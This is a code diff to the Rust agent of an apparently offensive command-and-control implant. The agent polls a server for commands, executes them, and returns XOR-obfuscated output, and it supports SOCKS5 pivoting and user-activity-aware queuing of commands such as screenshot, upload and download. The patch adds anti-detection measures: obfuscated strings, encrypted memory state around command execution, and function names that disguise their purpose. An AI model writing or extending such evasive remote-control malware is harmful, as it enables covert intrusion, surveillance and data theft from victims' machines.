@@ -19,14 +19,16 @@ use std::path::Path;
 use std::process::Command;
 use std::sync::Arc;
 use std::sync::Mutex;
-use std::time::{Duration}; // commented out SystemTime, UNIX_EPOCH
+use std::time::{Duration};
 use tokio::sync::Mutex as TokioMutex;
 use tokio::sync::mpsc;
 use tokio::task::JoinHandle;
 use tokio::time::timeout;
+use obfstr::obfstr;
 
 static PIVOT_SERVERS: Lazy<TokioMutex<HashMap<u16, JoinHandle<()>>>> = Lazy::new(|| TokioMutex::new(HashMap::new()));
 static QUEUED_COMMANDS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::new()));
+
 
 #[cfg(windows)]
 fn create_command(command: &str, args: &[&str]) -> Command {
@@ -87,6 +89,12 @@ async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
         return Ok(format!("Current directory: {}", env::current_dir()?.display()));
     }
 
+    // PATCH: Decrypt sensitive state before command execution
+    {
+        let mut protector = crate::state::MEMORY_PROTECTOR.lock().unwrap();
+        protector.unprotect();
+    }
+
     // Handle other commands with timeout
     let result = timeout(Duration::from_secs(30), async {
         let output = if cfg!(windows) {
@@ -101,6 +109,12 @@ async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
             String::from_utf8_lossy(&output.stderr)))
     }).await;
 
+    // PATCH: Re-encrypt sensitive state immediately after command execution
+    {
+        let mut protector = crate::state::MEMORY_PROTECTOR.lock().unwrap();
+        protector.protect();
+    }
+
     match result {
         Ok(Ok(output)) => Ok(output),
         Ok(Err(e)) => Err(e),
@@ -110,7 +124,7 @@ async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
 
 // Send heartbeat to the server
 async fn send_heartbeat_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str) -> io::Result<()> {
-    let url = format!("{}/api/agent/{}/heartbeat", server_addr, agent_id);
+    let url = format!("{}/{}", server_addr, obfstr!("api/agent/{}/heartbeat").to_string().replace("{}", agent_id));
     info!("[HTTP] Sending heartbeat POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
     let client = config.build_http_client()?;
     
@@ -151,7 +165,7 @@ async fn send_heartbeat_with_client(config: &AgentConfig, server_addr: &str, age
 
 // Fetch command from the server
 async fn get_command_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str) -> io::Result<Option<String>> {
-    let url = format!("{}/api/agent/{}/command", server_addr, agent_id);
+    let url = format!("{}/{}", server_addr, obfstr!("api/agent/{}/command").to_string().replace("{}", agent_id));
     info!("[HTTP] Sending command GET to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
     let client = config.build_http_client()?;
     let response = client.get(&url)
@@ -191,7 +205,7 @@ async fn submit_result_with_client(
     command: &str,
     output: &str
 ) -> io::Result<()> {
-    let url = format!("{}/api/agent/{}/result", server_addr, agent_id);
+    let url = format!("{}/{}", server_addr, obfstr!("api/agent/{}/result").to_string().replace("{}", agent_id));
     info!("[HTTP] Sending result POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
     let client = config.build_http_client()?;
     let obfuscated_output = xor_obfuscate(output, agent_id);
@@ -218,16 +232,27 @@ async fn submit_result_with_client(
     Ok(())
 }
 
-fn is_quiet_command(cmd: &str) -> bool {
-    // Only these are allowed in FullOpsec
-    let quiet = ["ping", "echo"];
+fn is_weak_command(cmd: &str) -> bool {
+    let quiet = [
+        obfstr!("ping").to_string(),
+        obfstr!("echo").to_string(),
+    ];
     quiet.iter().any(|q| cmd.starts_with(q))
 }
 
-fn is_noisy_command(cmd: &str) -> bool {
-    // Expanded noisy commands
+fn is_strong_command(cmd: &str) -> bool {
     let noisy = [
-        "screenshot", "scan", "upload", "download", "ls", "ps", "netstat", "ifconfig", "whoami", "uname", "cat"
+        obfstr!("screenshot").to_string(),
+        obfstr!("scan").to_string(),
+        obfstr!("upload").to_string(),
+        obfstr!("download").to_string(),
+        obfstr!("ls").to_string(),
+        obfstr!("ps").to_string(),
+        obfstr!("netstat").to_string(),
+        obfstr!("ifconfig").to_string(),
+        obfstr!("whoami").to_string(),
+        obfstr!("uname").to_string(),
+        obfstr!("cat").to_string(),
     ];
     noisy.iter().any(|n| cmd.starts_with(n))
 }
@@ -238,7 +263,7 @@ async fn should_execute_command(cmd: &str) -> bool {
     debug!("[OPSEC] should_execute_command: mode={:?}, cmd={}", mode, cmd);
     match mode {
         AgentMode::FullOpsec => {
-            if is_quiet_command(cmd) {
+            if is_weak_command(cmd) {
                 debug!("[OPSEC] FullOpsec: Quiet command allowed: {}", cmd);
                 true
             } else {
@@ -252,7 +277,7 @@ async fn should_execute_command(cmd: &str) -> bool {
 }
 
 // Main function to run the shell
-pub async fn run_shell(
+pub async fn agent_loop(
     server_addr: &str,
     agent_id: &str,
     pivot_handler: Arc<TokioMutex<Socks5PivotHandler>>,
@@ -263,7 +288,7 @@ pub async fn run_shell(
     send_heartbeat_with_client(&config, server_addr, agent_id).await?;
 
     loop {
-        let mode = determine_agent_mode();
+        let mode = determine_agent_mode(&config);
         let (base, jitter) = match mode {
             AgentMode::FullOpsec => (2, 2),
             AgentMode::BackgroundOpsec => (1, 1),
@@ -330,7 +355,7 @@ pub async fn run_shell(
         }
 
         // In BackgroundOpsec, drain and execute queued commands
-        if let AgentMode::BackgroundOpsec = determine_agent_mode() {
+        if let AgentMode::BackgroundOpsec = determine_agent_mode(&config) {
             let mut queue = QUEUED_COMMANDS.lock().unwrap();
             for cmd in queue.drain(..) {
                 debug!("[OPSEC] BackgroundOpsec: Executing queued command: {}", cmd);
@@ -342,9 +367,9 @@ pub async fn run_shell(
         }
 
         // After all command handling and sleeping:
-        if crate::opsec::determine_agent_mode() == crate::opsec::AgentMode::FullOpsec {
+        if crate::opsec::determine_agent_mode(&config) == crate::opsec::AgentMode::FullOpsec {
             info!("[OPSEC] User activity or risk detected! Returning to FullOpsec.");
-            break Ok(()); // Exit run_shell, main loop will re-encrypt and wait
+            break Ok(()); // Exit agent_loop, main loop will re-encrypt and wait
         }
     }
 }
@@ -385,7 +410,7 @@ pub async fn handle_command(command: &str) {
     let mode = OPSEC_STATE.lock().unwrap().mode;
     match mode {
         AgentMode::FullOpsec => {
-            if is_noisy_command(command) {
+            if is_strong_command(command) {
                 debug!("[OPSEC] FullOpsec: Queuing noisy command: {}", command);
                 QUEUED_COMMANDS.lock().unwrap().push(command.to_string());
                 return;
